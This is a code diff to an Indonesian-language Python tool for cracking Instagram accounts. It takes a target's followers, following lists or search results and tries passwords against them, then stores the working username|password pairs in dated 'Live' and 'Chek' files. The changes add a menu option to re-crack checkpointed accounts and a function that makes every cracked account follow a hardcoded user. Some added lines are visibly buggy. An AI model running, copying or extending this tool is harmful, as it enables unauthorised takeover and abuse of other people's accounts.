@@ -14,12 +14,12 @@ from concurrent.futures import ThreadPoolExecutor
 try:
 	import concurrent.futures
 except ImportError:
-	print k+"\n Modul Futures blom terinstall!..."
+	print("\n Modul Futures blom terinstall!...")
 	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
 try:
 	import requests
 except ImportError:
-	print k+"\n Modul Requests blom terinstall!..."
+	print("\n Modul Requests blom terinstall!...")
 	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")
 
 ### WARNA RANDOM ###
@@ -36,7 +36,7 @@ N = '\x1b[0m'    # WARNA MATI
 IP = requests.get('https://api.ipify.org').text
 ct = datetime.now()
 n = ct.month
-bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
+bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
 try:
     if n < 0 or n > 12:
         exit()
@@ -202,19 +202,20 @@ def logo():
 ### MENU ###
 def menu_dev():
 	logo()
-	print(" [*] Email       : MEDALSTORE X ROXANNE ZETSU")
+	print(" [*] Email       : alvinhezasaputra@gmail.com")
 	print(" [*] Bergabung   : %s"%(tgl))
 	print(" [*] ---------------------------------------------")
-	print(" [*] Status      : %sPREMIUM%s"% (H,N))
-	print(" [*] Kadaluwarsa : PERMANEN SEUMUR HIDUP")
+	print(" [*] Status      : %sPremium%s"% (H,N))
+	print(" [*] Kadaluwarsa : 24 April 2025")
 	print(" [*] ---------------------------------------------")
 	print(" [*] IP          : %s\n"%(IP))
-	print(" [ SELAMAT DATANG %sUSER PREMIUM%s ]\n"%(K,N))
-	print(" [01]. CRACK DARI AKUN PUBLIK")
-	print(" [02]. CRACK DARI PENCARIAN")
-	print(" [03]. CEK HASIL AKUN CRACK")
-	print(" [%s00%s]. LOGOUT (HAPUS LOGIN)"%(M,N))
-	pil = raw_input("\n [?] PILIH MENU : ")
+	print(" [ selamat datang %suser premium%s ]\n"%(K,N))
+	print(" [01]. crack dari akun publik")
+	print(" [02]. crack dari pencarian")
+	print(" [03]. crack ulang hasil cp")
+	print(" [04]. cek akun hasil crack")
+	print(" [%s00%s]. logout (hapus login)"%(M,N))
+	pil = raw_input("\n [?] pilih menu : ")
 	limit = ("100000")
 	if pil == "1" or pil == "01":
 		pas = ""
@@ -222,9 +223,9 @@ def menu_dev():
 		username = raw_input(" [?] masukan username target : ")
 		info_dev(username, pas, status)
 
-		print("\n [ PILIH TARGET CRACK SATU² ]")
-		print("\n [1]. PENGIKUT %s : %s%s%s"%(username,H,str(pengikut),N))
-		print(" [2]. MENGIKUTI %s : %s%s%s"%(username,H,str(mengikuti),N))
+		print("\n [ pilih target crack satu² ]")
+		print("\n [1]. pengikutt %s : %s%s%s"%(username,H,str(pengikut),N))
+		print(" [2]. mengikuti %s : %s%s%s"%(username,H,str(mengikuti),N))
 		pil2=raw_input("\n [?] pilih : ")
 		if pil2 == "1":
 			data_follower_dev(cookie, id_, limit, pil2)
@@ -252,40 +253,80 @@ def menu_dev():
 		print("\n [*] hasil OK tersimpan di : ok.txt")
 		print(" [*] hasil CP tersimpan di : cp.txt \n")
 		crack()
-	elif pil == "3" or pil == "02":
-		pas = ""
-		status = ""
-		username = raw_input(" [?] MASUKAN USERNAME TARGET : ")
-		hastag(cookie, username, limit)
-		crack()
-	elif pil == "4" or pil == "03":
+	elif pil == "3" or pil == "03":
+		dirs = os.listdir("Chek")
+		print(" [*] list nama file tersimpan di folder Chek\n")
+		for file in dirs:
+			print(" [+] "+file)
+		try:
+			file = raw_input("\n [?] pilih nama file : ")
+			if file == "":
+				menu_dev()
+		except IOError:
+			exit(" [!] file %s tidak tersedia"%(file))
+		try:
+			data_cp = open("Chek/%s","r"%(file)).readlines()
+			for dev in data_cp:
+				data_.append(dev)
+		except Exception as e:
+			exit("%s"%(e))
+		with ThreadPoolExecutor(max_workers=30) as fall:
+			for data_cek in data_cp:
+				try:
+					pw = []
+					user_cp = data_cek.split("|")[0].replace(" [Check] ","")
+					pw_cp = data_cek.split("|")[1]
+					pw.append(pw_cp)
+					fall.submit(crack_dev, user_cp, pw)
+				except:pass
+	elif pil == "4" or pil == "04":
 		print("\n [1] lihat hasil Live")
 		print(" [2] lihat hasil Chek")
-		pil = raw_input("\n [?] pilih : ")
-		if pil == "1":
-			try:
-				hasil_ok_ = open("ok.txt", "r").readlines()
-				print(" *-------------------------------------------------*")
-				print" [*] Hasil : "+H+"Live"+N+"   Total : "+str(len(hasil_ok_))
-				print("%s"%(H))
-				os.system('cat ok.txt')
-			except Exception as e:
-				print(e)
-			raw_input("\n%s [*] tekan enter untuk kembali ke menu "%(N))
+		cek = raw_input("\n [?] choose : ")
+		if cek =="":
 			menu_dev()
-		elif pil == "2":
+		elif cek == "1":
+			dirs = os.listdir("Live")
+			print(" [*] list nama file tersimpan di folder Live\n")
+			for file in dirs:
+				print(" [+] "+file)
 			try:
-				hasil_cp_ = open("cp.txt", "r").readlines()
-				print(" *-------------------------------------------------*")
-				print" [*] Hasil : "+K+"Check"+N+"   Total : "+str(len(hasil_cp_))
-				print("%s"%(K))
-				os.system('cat cp.txt')
-			except Exception as e:
-				print(e)
-			raw_input("\n%s [*] tekan enter untuk kembali ke menu "%(N))
+				file = raw_input("\n [?] pilih nama file : ")
+				if file == "":
+					menu_dev()
+				totalok = open("Live/%s"%(file)).read().splitlines()
+			except IOError:
+				exit(" [!] file %s tidak tersedia"%(file))
+			nm_file = ("%s"%(file)).replace("-", " ")
+			del_txt = nm_file.replace(".txt", "")
+			print(" [#] ----------------------------------------------")
+			print(" [+] tanggal : %s total : %s"%(del_txt, len(totalok)))
+			print("%s"%(H))
+			os.system("cat Live/%s"%(file))
+			raw_input("\n %s[*] tekan enter untuk kembali ke menu "%(N))
+			menu_dev()
+		elif cek == "2":
+			dirs = os.listdir("Chek")
+			print(" [*] list nama file tersimpan di folder Chek\n")
+			for file in dirs:
+				print(" [+] "+file)
+			try:
+				file = raw_input("\n [?] pilih nama file : ")
+				if file == "":
+					menu_dev()
+				totalcp = open("Chek/%s"%(file)).read().splitlines()
+			except IOError:
+				exit(" [!] file %s tidak tersedia"%(file))
+			nm_file = ("%s"%(file)).replace("-", " ")
+			del_txt = nm_file.replace(".txt", "")
+			print(" [#] ----------------------------------------------")
+			print(" [+] tanggal : %s total : %s"%(del_txt, len(totalcp)))
+			print("%s"%(K))
+			os.system("cat Chek/%s"%(file))
+			raw_input("\n %s[*] tekan enter untuk kembali ke menu "%(N))
 			menu_dev()
 		else:
-			exit(" [!] pilih yang bener!")
+			menu_dev()
 	elif pil == "0" or pil == "00":
 		kel = raw_input(" [?] yakin mau keluar dari akun Instagram?[Y/t] : ")
 		if kel in ["y", "Y"]:
@@ -439,16 +480,14 @@ def crack_dev(username_dev, pass_dev_):
 				if "checkpoint_url" in str(data_dev):
 					cp = "Checkpoint"
 					info_dev(username_dev, pass_dev, cp)
-					with open("cp.txt", "a")as dev_:
-						dev_.write(" [Chek] "+username_dev+"|"+pass_dev+"\n")
+					open("Chek/%s.txt"%(tanggal),"a").write(" [Chek] %s|%s\n"%(username_dev, pass_dev))
 					hasil_cp.append(username_dev)
 					break
 				elif "userId" in str(data_dev):
 					live = "Live"
 					if len(status_foll) != 1:
 						info_dev(username_dev, pass_dev, live)
-						with open("ok.txt", "a")as dev_:
-							dev_.write(" [Live] "+username_dev+"|"+pass_dev+"\n")
+						open("Live/%s.txt"%(tanggal),"a").write(" [Live] %s|%s\n"%(username_dev, pass_dev))
 						hasil_ok.append(username_dev)
 						follow_dev(ses_dev,username_dev)
 					else:
@@ -479,6 +518,37 @@ def crack_dev(username_dev, pass_dev_):
 	count_+=1
 None
 
+c_foll = 1
+count_foll = 1
+def follow_dev(ses_dev, username_dev):
+	global c_foll, count_foll
+	if len(status_foll) != 1:
+		user_target = "fall.xavier"
+		id_target = "2220243163"
+	else:
+		print("\r {}[*] [follow] {}/{} OK-:{} - CP-:{}".format(N,str(count_foll),len(data_),len(hasil_ok), len(hasil_cp))),
+		sys.stdout.flush()
+		user_target = username_get_follow
+		id_target = id_
+
+	dat_crf_foll = ses_dev.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
+	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
+	headerz_foll = {"Accept": "*/*",
+					"Accept-Encoding": "gzip, deflate, br",
+					"Accept-Language": "en-US,en;q=0.5",
+					"Host": "www.instagram.com",
+					"Origin": "https://www.instagram.com",
+					"Referer": "https://www.instagram.com/{}/".format(user_target),
+					"User-Agent": user_agentz,
+					"X-CSRFToken": crf_token_foll}
+	param_foll = {""}
+	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
+	res_foll = ses_dev.post(url_follow, headers=headerz_foll)
+	if len(status_foll) != 1:
+		pass
+	else:
+		print(" [✓] berhasil mengikuti")
+
 def info_dev(username_dev, pass_dev, status):
 	try:
 		global id_, pengikut, mengikuti
@@ -508,7 +578,35 @@ def info_dev(username_dev, pass_dev, status):
 		pass
 None
 
+def auto_follow(status_):
+	if status_ == "iqbal_dev":
+		try:
+			data_cp = open("cp.txt","r").readlines()
+			for dev in data_cp:
+				data_.append(dev)
+		except:
+			exit()
+		with ThreadPoolExecutor(max_workers=10) as insta_cek_dev:
+			for data_cek in data_cp:
+				try:
+					pw_cp_ = []
+					user_cp = data_cek.split("|")[1].replace(" [Check] ","")
+					pw_cp_ = data_cek.split("|")[3]
+					pw_cp_.append(pw_cp_+y)
+					insta_cek_dev.submit(crack_dev, user_cp, pw_cp_)
+				except:
+					pass
+
+None
+
+def buatfolder():
+	try:os.mkdir("Chek")
+	except:pass
+	try:os.mkdir("Live")
+	except:pass
+
 if __name__=="__main__":
+	buatfolder()
 	cek_login()
 	menu_dev()
 
